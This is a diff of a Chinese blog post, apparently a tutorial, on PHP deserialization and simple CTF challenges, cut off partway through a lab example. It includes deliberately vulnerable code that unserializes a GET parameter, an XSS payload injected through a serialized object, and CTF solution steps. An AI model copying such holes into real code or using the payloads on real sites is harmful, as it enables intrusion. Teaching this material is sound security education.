-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __sleep(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__sleep&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __wakeup(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__wakeup&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//创建对象调用__construct
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $object &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;();
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//序列化对象调用__sleep
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $serialize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($object);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//输出序列化后的字符串
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;serialize: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$serialize&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//反序列化对象调用__wakeup
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $unserialize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($serialize);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//调用pt输出数据
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $unserialize&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;();
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//脚本结束调用__destruct
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18.png&#34;
-	width=&#34;1225&#34;
-	height=&#34;890&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;test&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $a&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;hacked by fra&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $b&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;hacked by fra2&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;pt&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;a&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __construct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__construct&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__destruct&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __sleep(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__sleep&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __wakeup(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__wakeup&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//创建对象调用__construct
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    $object &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;test&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//序列化对象调用__sleep
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    $serialize &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($object);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//输出序列化后的字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;serialize: &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$serialize&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//反序列化对象调用__wakeup
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    $unserialize&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($serialize);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//调用pt输出数据
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    $unserialize&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;pt&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#75715e"&gt;//脚本结束调用__destruct
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18.png"
+	width="1225"
+	height="890"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;137&#34;
-		data-flex-basis=&#34;330px&#34;
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="330px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;看一段存在反序列化漏洞的代码&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class flag{
     public $flag = &amp;#34;demon&amp;#34;;
@@ -1022,7 +1018,7 @@ class flag{
 $a = $_GET[&amp;#39;v&amp;#39;];
 $b = unserialize($a);
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用方法是本地新建一个一样的类，但是更改flag变量的值为&lt;code&gt;&amp;lt;img/src/onerror=alert(1)&amp;gt;&lt;/code&gt;,这样再通过序列化的方式输出序列化后的字符串，再将序列化字符串传入v参数，这样即可更改原本的flag值同时输出到页面。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class flag{
     public $flag = &amp;#34;&amp;lt;img/src/onerror=alert(1)&amp;gt;&amp;#34;;
@@ -1033,33 +1029,33 @@ class flag{
 $c = new flag();
 $d = serialize($c);
 print_r($d);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49.png&#34;
-	width=&#34;1267&#34;
-	height=&#34;378&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49.png"
+	width="1267"
+	height="378"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;335&#34;
-		data-flex-basis=&#34;804px&#34;
+		class="gallery-image" 
+		data-flex-grow="335"
+		data-flex-basis="804px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56.png&#34;
-	width=&#34;837&#34;
-	height=&#34;189&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56.png"
+	width="837"
+	height="189"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;442&#34;
-		data-flex-basis=&#34;1062px&#34;
+		class="gallery-image" 
+		data-flex-grow="442"
+		data-flex-basis="1062px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这就是php反序列化的入门基础部分，接下来看看简单的序列化题目。&lt;/p&gt;
-&lt;h2 id=&#34;简单序列化ctf题目案例&#34;&gt;简单序列化ctf题目案例&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;h2 id="简单序列化ctf题目案例"&gt;简单序列化ctf题目案例&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 error_reporting(0);
 include(&amp;#39;../flag.php&amp;#39;);
 $KEY = &amp;#34;TTEESSTT!!&amp;#34;;
@@ -1071,170 +1067,170 @@ if (unserialize($str) === &amp;#34;$KEY&amp;#34;)
 
 show_source(__FILE__);
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概意思就是变量str反序列化之后的值等于&lt;code&gt;TTEESSTT!!&lt;/code&gt;,所以直接将该变量序列化输出就好&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$KEY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TTEESSTT!!&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;print_r&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($KEY));
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10.png&#34;
-	width=&#34;1021&#34;
-	height=&#34;257&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$KEY &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;TTEESSTT!!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;print_r&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($KEY));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10.png"
+	width="1021"
+	height="257"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;397&#34;
-		data-flex-basis=&#34;953px&#34;
+		class="gallery-image" 
+		data-flex-grow="397"
+		data-flex-basis="953px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;传入该字符串即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11.png&#34;
-	width=&#34;667&#34;
-	height=&#34;230&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11.png"
+	width="667"
+	height="230"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;290&#34;
-		data-flex-basis=&#34;696px&#34;
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="696px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;某靶场的一道反序列化相关的题目&lt;/p&gt;
 &lt;p&gt;index.php&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$txt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;txt&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($txt) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($txt, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;welcome to the ctf&amp;#34;&lt;/span&gt;)){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello friends!&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
